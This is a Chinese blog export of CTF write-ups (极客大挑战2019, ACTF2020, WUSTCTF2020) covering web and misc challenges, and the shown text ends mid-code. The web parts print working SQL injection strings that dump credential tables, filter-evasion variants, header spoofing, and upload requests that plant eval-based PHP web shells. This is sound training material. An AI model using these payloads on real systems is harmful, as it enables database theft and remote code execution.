<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后再<code>cat /flag</code>就得到flag了</p>
<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>简单注入，先用万能密码登录一下，然后用order语句查表发现有三列</p>
<p>没有过滤，sqlmap就不要搞了，手工联合注一下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;union select 1,2,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39;#</span><br><span class="line">1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;#</span><br><span class="line">1&#39;union select 1,2,group_concat(concat_ws(&#39;~&#39;,username,password)) from geek.l0ve1ysq1#</span><br></pre></td></tr></table></figure></div>

<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>查看源码发现<code>Secret.php</code></p>
<p>访问后提示：It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;，加一下Referer:https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;，加一下Referer:https://www.Sycsecret.com</a></p>
<p>再次访问后提示：Please use “Syclover” browser，改一下UA:Syclover</p>
<p>最后访问后提示：No!!! you can only read this locally!!!，加一个XFF:127.0.0.1</p>
<p>最后访问得到flag</p>
<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>首先尝试万能密码，发现or被过滤掉，双写绕过</p>
<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>登录成功，尝试联合注入，发现union、select、where、from被过滤</p>
<p>注入代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;&#39;geek&#39;--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(concat_ws(&#39;~&#39;,username,passwoorrd)) frofromm geek.b4bsql--+</span><br></pre></td></tr></table></figure></div>

<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p>打开后在menu出找到buyflag，跳转后查看源代码发现</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>并且有提示<code>Only Cuit&#39;s students can buy the FLAG</code>，猜不到构造什么http头，所以抓包看看</p>
<p>发现http头中Cookie中有user=0，将其改为user=1</p>
<p>令password=404a，即可绕过数字判断，下面强制比较时会强制转化，所以成功绕过</p>
<p>直接post，money提示<code>Nember lenth is too long</code>，利用strcmp比较数组和字符时会返回零的特点进行绕过，得到flag</p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>后缀检测、文件头检测、Content-Type检测、上传文件大小检测、&lt;? 检测</p>
<p>蚁剑连上去得到下面源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_FILES[<span class="string">"file"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php2"</span>,<span class="string">"php3"</span>,<span class="string">"php4"</span>,<span class="string">"php5"</span>,<span class="string">"pht"</span>,<span class="string">"phtm"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $file[<span class="string">"name"</span>]);</span><br><span class="line">$extension = strtolower(end($temp));        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">$image_type = @exif_imagetype($file[<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span> ((($file[<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp;$file[<span class="string">"size"</span>] &lt; <span class="number">20480</span>)    <span class="comment">// 小于 20 kb</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($file[<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ERROR!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (in_array($extension, $allowedExts)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NOT！"</span>.$extension.<span class="string">"!"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">elseif</span> (mb_strpos(file_get_contents($file[<span class="string">"tmp_name"</span>]), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NO! HACKER! your file included '&amp;#x3C;&amp;#x3F;'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Don't lie to me, it's not image at all!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $fileName=<span class="string">'./upload/'</span>.$file[<span class="string">'name'</span>];</span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>],$fileName); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $file[<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Not image!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>绕过姿势：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a? &lt;script language&#x3D;&quot;Php&quot;&gt;eval($_REQUEST[pass])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3>]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020新生赛</title>
    <url>/2020/04/13/ACTF2020/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>这个题主要考用php://filter伪协议进行文件包含</p>
<p>进入题目发现url中有?file=flag.php，首先想到用php://伪协议来发送php代码，然后发现提示：<code>hacker!</code></p>
<p>然后就想到用php://filter来读取flag.php文件base64源码</p>
<a href="/2020/04/13/ACTF2020/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>base64解码后得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;1d7f32d1-354d-4f5a-b1dd-cd41e002f741&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p>基础的命令执行</p>
<a href="/2020/04/13/ACTF2020/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>备份文件、ezbypass</p>
<p>题目名字提示已经bak文件了，我还是扫了一下。</p>
<a href="/2020/04/13/ACTF2020/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要满足是数字且的<code>$key == $str</code>因为php中string转int时会只保留数字，令<code>key=123</code>即可</p>
<a href="/2020/04/13/ACTF2020/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>JS前端验证、ph扩展名绕过</p>
<p>本来以为要绕过前端验证，传.htaccess的发现它会自动加个前缀，无法实现解析功能，然后试着传了ph类的东西，发现phtml可以传上去</p>
<a href="/2020/04/13/ACTF2020/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/04/13/ACTF2020/5.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_REQUEST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure></div>

<p>蚁剑连一下，得到flag</p>
<p>index.php的源码，看到过滤了php、php345，还有加了个md5的前缀</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//设置上传目录</span></span><br><span class="line">	define(<span class="string">"UPLOAD_PATH"</span>, <span class="string">"./uplo4d"</span>);</span><br><span class="line">	$msg = <span class="string">"Upload Success!"</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>])) &#123;</span><br><span class="line">	        <span class="keyword">exit</span>(<span class="string">'nonono~ Bad file！'</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">        $new_file_name = md5($file_name).<span class="string">"."</span>.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'Upload Failed!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;div style="color:#F00"&gt;'</span>.$msg.<span class="string">" Look here~ "</span>.$img_path.<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到.htaccess文件的内容就是解析phtml为可执行php文件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.phtml$&gt;</span><br><span class="line">	SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><p>题目=解题方法</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">bin_str=<span class="string">''</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'stego.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">		stegb64=<span class="string">""</span>.join(line.split())</span><br><span class="line">		rowb64=<span class="string">""</span>.join(str(base64.b64encode(base64.b64decode(stegb64)),<span class="string">'utf-8'</span>).split())</span><br><span class="line">		offset=abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">		equalnum=line.count(<span class="string">'='</span>)</span><br><span class="line">		<span class="keyword">if</span> equalnum:</span><br><span class="line">			bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">	print(<span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bin_str),<span class="number">8</span>)]))</span><br></pre></td></tr></table></figure></div>

<p>运行脚本得到flag：<code>ACTF{6aseb4_f33!}</code></p>
<h3 id="NTFS数据流"><a href="#NTFS数据流" class="headerlink" title="NTFS数据流"></a>NTFS数据流</h3><p>下载解压后发现500个txt，第293三个明显不同</p>
<p>拿<code>NtfsStreamsEditor2.exe</code>导出一下得到flag：<code>ACTF{AAAds_nntfs_ffunn?}</code> </p>
<h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>Outguess、图片属性、社会主义核心价值编码</p>
<p>图片属性里有社会主义核心价值编码，解码后得到key：abc</p>
<p>Outguess解一下图片即可得到flag</p>
<h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>导出http对象、伪加密、strings一下（或者vim -r</p>
<p>wireshark导出http对象，然后010改一下伪加密，得到.flag.swp，strings输出得到flag，或者vim -r恢复一下swp文件得到flag：<code>actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</code></p>
<a href="/2020/04/13/ACTF2020/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/13/ACTF2020/6.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>文件分离、明文攻击</p>
<p>把woo.jpg里面的压缩包分离出来，然后根据这两个压缩包进行明文攻击</p>
<p>得到flag：<code>ACTF{3te9_nbb_ahh8}</code></p>
<h3 id="剑龙"><a href="#剑龙" class="headerlink" title="剑龙"></a>剑龙</h3><p>aaencode、属性、steghide、des、stegosaurus隐写</p>
<p>将<code>pwd.txt</code>里面的颜文字解码得到：<code>welcom3!</code>，然后将其作为密钥，解出<code>hh.jpg</code>的steghide的隐写</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide.exe extract -sf hh.jpg</span><br><span class="line">Enter passphrase:welcom3!</span><br><span class="line">wrote extracted data to &quot;secret.txt&quot;.</span><br><span class="line"></span><br><span class="line">secret.txt:</span><br><span class="line">想要flag吗？解出我的密文吧~</span><br><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></div>

<p>在<code>hh.jpg</code>属性里找到密钥：<code>@#$%^&amp;%%$)</code></p>
<a href="/2020/04/13/ACTF2020/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>提示stegosaurus隐写，其实直接file O_O就可以得到<code>O_O: python 3.6 byte-compiled</code>也能猜到pyc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;stegosaurus -x O_O.pyc</span><br><span class="line">Extracted payload: flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="frequency"><a href="#frequency" class="headerlink" title="frequency"></a>frequency</h3><p>隐藏文字和属性连起来base64、字频统计</p>
<p>u1s1，这题咋猜到连起来的。。将两段base64连起来字频统计后得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;a&#39;, &#39;c&#39;, &#39;t&#39;, &#39;f&#39;, &#39;p&#39;, &#39;l&#39;, &#39;o&#39;, &#39;k&#39;, &#39;m&#39;, &#39;i&#39;, &#39;j&#39;, &#39;n&#39;, &#39;u&#39;, &#39;h&#39;, &#39;b&#39;, &#39;y&#39;, &#39;g&#39;, &#39;v&#39;, &#39;r&#39;, &#39;d&#39;, &#39;x&#39;, &#39;e&#39;, &#39;s&#39;, &#39;z&#39;, &#39;w&#39;, &#39;q&#39;, &#39;&#125;&#39;, &#39;&#123;&#39;, &#39;_&#39;, &#39;^&#39;, &#39;]&#39;, &#39;[&#39;, &#39;Z&#39;, &#39;Y&#39;, &#39;X&#39;, &#39;W&#39;, &#39;V&#39;, &#39;U&#39;, &#39;T&#39;, &#39;S&#39;, &#39;R&#39;, &#39;Q&#39;, &#39;P&#39;, &#39;O&#39;, &#39;N&#39;, &#39;M&#39;, &#39;L&#39;, &#39;K&#39;, &#39;J&#39;, &#39;I&#39;, &#39;H&#39;, &#39;G&#39;, &#39;F&#39;, &#39;E&#39;, &#39;D&#39;, &#39;C&#39;, &#39;B&#39;, &#39;A&#39;, &#39;@&#39;, &#39;&#x3D;&#39;, &#39;9&#39;, &#39;8&#39;, &#39;7&#39;, &#39;6&#39;, &#39;5&#39;, &#39;4&#39;, &#39;3&#39;, &#39;2&#39;, &#39;1&#39;, &#39;0&#39;, &#39;-&#39;, &#39;+&#39;, &#39;*&#39;, &#39;)&#39;, &#39;(&#39;, &#39;&amp;&#39;, &#39;%&#39;, &#39;$&#39;, &#39;#&#39;, &#39;!&#39;, &#39; &#39;]</span><br></pre></td></tr></table></figure></div>

<p>放一下脚本：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alphabet = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]"</span></span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span><span class="params">(d)</span>:</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(sort_by_value(result))</span><br></pre></td></tr></table></figure></div>

<h3 id="music"><a href="#music" class="headerlink" title="music"></a>music</h3><p>文件异或</p>
<p>有大量A1出现，本应该是00的所以整个文件于A1进行异或得到原本mp4文件</p>
<a href="/2020/04/13/ACTF2020/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>收听音频得到flag</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020</title>
    <url>/2020/04/02/WUSTCTF2020/</url>
    <content><![CDATA[<!--看不下去资料呀，web基础知识也学不下去呀，唉，先面向题目学习吧-->

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h3><p>robots协议、HTTP头、简单bypass</p>
<p>看网页标题，暗示查看<code>robots.txt</code>，在里面发现<code>fAke_f1agggg.php</code></p>
<p>访问后F12，查看到http头中有一项<code>Look_at_me: /fl4g.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//level 2 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123; </span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>]; </span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5)) </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>; </span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; 